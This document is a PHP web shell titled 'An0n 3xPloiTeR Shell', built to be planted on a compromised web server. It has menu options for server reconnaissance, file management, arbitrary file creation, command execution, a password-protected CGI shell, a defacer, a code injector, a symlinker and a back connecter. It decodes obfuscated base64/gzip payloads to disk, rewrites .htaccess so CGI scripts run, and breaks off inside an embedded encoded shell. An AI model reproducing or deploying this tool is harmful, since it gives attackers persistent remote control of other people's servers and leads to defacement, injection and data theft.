<!DOCTYPE html>
<html>
	<head>
		<title> Shell By An0n 3xPloiTeR</title>
		<meta charset="UTF-8" />
		<meta name="description" content="This  Shell is Designed By An0n 3xPloiTeR" />
		<meta name="note" content="Changing The Names Wont Make You The Author :)" />
		<meta http-equiv="refresh" content=""><!-- For Refreshing Page After 3600 Intervals of time -->
		<meta name="about" content="Use it where other shells dont work" />
        <meta name="author" content="An0n 3xPloiTeR,Umar Arfeen Shah" />
        <meta name="keywords" content="An0n 3xPloiTeR, Shell,Shell,An0n,3xPloiTeR, Shell By An0n 3xPloiTeR, Shell" />
		<meta name="revisit-after" content="1800" />
		<meta name="language" content="en" />
		<meta content='general' name='rating' />
		<meta content='google' name='generator' />
		<meta content='follow,all' name='msnbot' />
		<meta content='follow,all' name='alexabot' />
		<meta content='pakistan' name='geo.placename' />
		<meta content="index,follow,all" name="googlebot" />
		<meta http-equiv="X-UA-Compatible" content="IE-edge" />
		<link rel="SHORTCUT ICON" href="http://i.imgur.com/Ix3lhWm.jpg" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<meta name='search engines' content='Aeiwi,Alexa,AllTheWeb,AltaVista,AOLNetfind,Anzwers,Canada,DirectHit,EuroSeek,Excite,Overture,Go,Google,HotBot InfoMak,Kanoodle,Lycos,MachineSite,National Directory,Northern Light,SearchIt,SimpleSearch,WebsMostLinked,WebTop,What-U-Seek,AOL,Yahoo,WebCrawler,Infoseek,Excite,Magellan,LookSmart,bing,CNET,Googlebot' />
		<?php error_reporting(0); ?>
		<style>
			body {
				background-color: #080510;
			}
			.heading {
				text-align: center;
				font-size: 300%;
				font-family: cursive;
				color: red;
			}
			.buttons {
				margin-top: 2vh;
			}
			input {
				color: white;
				text-align: center;
				font-weight: bold; 
				font-family: cursive;
				border-left: #080510;
				border-right: #080510;
				border-style: groove;
				background-color: #080510; 
				font-size: 110%;
			}
			select {
				color: white;
				text-align: center;
				font-weight: bold; 
				font-family: cursive;
				border-left: black;
				border-right: black;
				border-style: groove;
				background-color: black;
			}
			option {
				color: white;
				text-align: center;
				font-weight: bold; 
				font-family: cursive;
				border-left: #080510;
				border-right: #080510;
				border-style: groove;
				background-color: #080510; 
			}
			textarea {
				color: white;
				font-weight: bold; 
				font-family: cursive;
				border-left: #080510;
				border-right: #080510;
				border-style: groove;
				background-color: #080510; 
			}
			iframe {
				color: white;
				font-weight: bold; 
				font-family: cursive;
				border-left: #080510;
				border-right: #080510;
				border-style: groove;
				background-color: #080510; 
			}
			a {
				text-decoration: none;
				color: white;
			}
			a:hover {
				text-decoration: none;
				color: teal;
			}
			.footer {
				position: fixed;
				left: 0px;
				right: 0px;
				bottom: 1vh;
				color: red;
				font-family: cursive;
				font-size: 160%;
				text-align: center;
			}
			.def {
				font-family: cursive;
				font-size: 100%;
				color: white;
			}
		</style>
	</head>
	<body>
		<div class="heading">
			<font>An0n 3xPloiTeR Shell</font><br>
		</div>
		<div class="buttons"><center>
			<a href="?server_info">
				<input type="submit" value="Server Info" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?file_manager">
				<input type="submit" value="File Manager" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?file_creator">
				<input type="submit" value="File Creator" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?cgi_shell">
				<input type="submit" value="CGI Shell" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?php_info">
				<input type="submit" value="Php Info" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?exec">
				<input type="submit" value="<?php 
				if(strtolower(substr(PHP_OS,0,3)) == "win") {$os = 'win';}else {$os = 'nix';}if($os == 'nix'){echo 'CMD';} else {echo 'Terminal'; } ?>" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?defacer">
				<input type="submit" value="Defacer" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?mass_injector">
				<input type="submit" value="Code Injector" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?uploader">
				<input type="submit" value="Uploader" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?shells">
				<input type="submit" value="Shells" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?scripts">
				<input type="submit" value="Scripts" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?symlink">
				<input type="submit" value="Symlinker" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?wp_title">
				<input type="submit" value="Wp Title" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?domains">
				<input type="submit" value="Domains" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?back_connecter">
				<input type="submit" value="Back Connecter" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?die">
				<input type="submit" value="Die" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			</center>
			<?php
					if (isset($_GET['server_info'])) {
					?>
						<center><br><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">Uname: <?php echo php_uname(); ?></font><br>
						<font style="color: silver; font-family: cursive; font-size: 130%;">Browser: <?php echo $_SERVER['HTTP_USER_AGENT']; ?></font><br>
						<font style="color: lawngreen; font-family: cursive; font-size: 130%;">Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?> </font><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">Server IP: <?php echo $_SERVER['SERVER_ADDR']; ?></font><br>
						<font style="color: lawngreen; font-family: cursive; font-size: 130%;">User IP: <?php echo $_SERVER['REMOTE_ADDR']; ?></font><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">User: <?php echo @get_current_user(); ?></font><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">Safe Mode:&nbsp;<?php $safe_mode = ini_get('safe_mode'); if ($safe_mode == 1) { echo '<span style="color: red;">On';} else {echo '<span style="color: lawngreen;">Off</span>';}?>
						</font><br>
						<font style="color: lawngreen; font-family: cursive; font-size: 130%;">Domains: <?php if(strtolower(substr(PHP_OS,0,3)) == "win") {$os = 'win';}else {$os = 'nix';}if($os == 'nix') {$doos = @file_get_contents("/etc/named.conf");if(!$doos) {$DomainS = "/var/named";$Domainonserver = scandir($DomainS);$d0c = count($Domainonserver);} else {@preg_match_all('/.*?zone "(.*?)" {/', $doos, $out);$out = sizeof(array_unique($out[1])); $d0c = $out."  Domains";}} else {$d0c = "1";} echo $d0c; }?>
					</center></font></center>
			<?php
			if (isset($_GET['file_manager'])) {
				$file_manager = "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";
				$writing = @fopen('file.php', "w");
				@fwrite($writing, htmlspecialchars_decode(gzinflate(base64_decode($file_manager))));
				@fclose($writing);
				?><br><br>
				<iframe src="file.php" width="100%" height="515"></iframe>
				<?php
			}
			?>
			<?php
				if (isset($_GET['file_creator'])) {
					?>
					<center><br><br>
					<form action="" method="POST">
						<font color="white" face="cursive" size="">Filename: </font>
						<input type="text" name="file_name" placeholder="File Name Here" /><br><br>
						<font color="white" face="cursive" size="">Content: </font><br>
						<textarea name="content_of_files" rows="10" cols="90"></textarea><br><br>
						<input type="submit" name="submissionoffilecreator" value="Submit" />
					</form>
					<?php
						$filename_in_file_creator = htmlspecialchars($_POST['file_name']);
						$contents_of_file = $_POST['content_of_files'];

					if (isset($_POST['file_name']) || isset($_POST['content_of_files']) || isset($_POST['submissionoffilecreator'])) {
						if (!empty($filename_in_file_creator) || !empty($contents_of_file)) {
						$handle = @fopen($filename_in_file_creator, 'w');
						@fwrite($handle, $contents_of_file);
						@fclose($handle);
						?><br><br>
						<font color="white" face="cursive" size="5">File With Name: <a href="<?php echo $filename_in_file_creator; ?>" target="_blank"><?php echo $filename_in_file_creator; ?></a> is created</font>
						<?php 
						} else {
							?><br><br>
							<font color="white" face="cursive" size="5">Please Input In All Fields :P</font>
						<?php
						}
					}
				}
			?>
			<?php
				if (isset($_GET['php_info'])) {
						?>
					<body style="color: black; background-color: #080510;">
					<font style="background-color: black; color: black;">
					<?php phpinfo(); echo '<br><br>';}?>
					<?php 
			?>
			<?php
				if (isset($_GET['file_creator'])) {
					?>
					<center><br><br>
					<form action="" method="POST">
						<font color="white" face="cursive" size="">Filename: </font>
						<input type="text" name="file_name" placeholder="File Name Here" /><br><br>
						<font color="white" face="cursive" size="">Content: </font><br>
						<textarea name="content_of_files" rows="10" cols="90"></textarea><br><br>
						<input type="submit" name="submissionoffilecreator" value="Submit" />
					</form>
					<?php
						$filename_in_file_creator = $_POST['file_name'];
						$contents_of_file = $_POST['content_of_files'];

					if (isset($_POST['file_name']) || isset($_POST['content_of_files']) || isset($_POST['submissionoffilecreator'])) {
						if (!empty($filename_in_file_creator) || !empty($contents_of_file)) {
						$handle = @fopen($filename_in_file_creator, 'w');
						@fwrite($handle, $contents_of_file);
						@fclose($handle);
						?><br><br>
						<font color="white" face="cursive" size="5">File With Name: <a href="<?php echo $filename_in_file_creator; ?>" target="_blank"><?php echo $filename_in_file_creator; ?></a> is created</font>
						<?php 
						} else {
							?><br><br>
							<font color="white" face="cursive" size="5">Please Input In All Fields :P</font>
							<?php
								}
							}
						}
					?>
					<?php
						if (isset($_GET['cgi_shell'])) {
							 ?>
							 <center><br><font style="color: white; font-family: cursive; font-size: 200%;">CgiTelNet</font><br><span class="def">Password: umar</span><br>
							<?php
							@mkdir('an0n_cgi', 0755);
							@chdir('an0n_cgi');
							$kokdosya = ".htaccess";
							$dosya_adi = "$kokdosya";
							$dosya = @fopen($dosya_adi, 'w');
							$metin = "T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ0KQWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLWNnaSAuY2luDQpBZGRIYW5kbGVyIGNnaS1zY3JpcHQgLmNpbg0KQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5jaW4=";
							@fwrite($dosya, base64_decode($metin));
							@fclose($dosya);
							$cgishellizocin = '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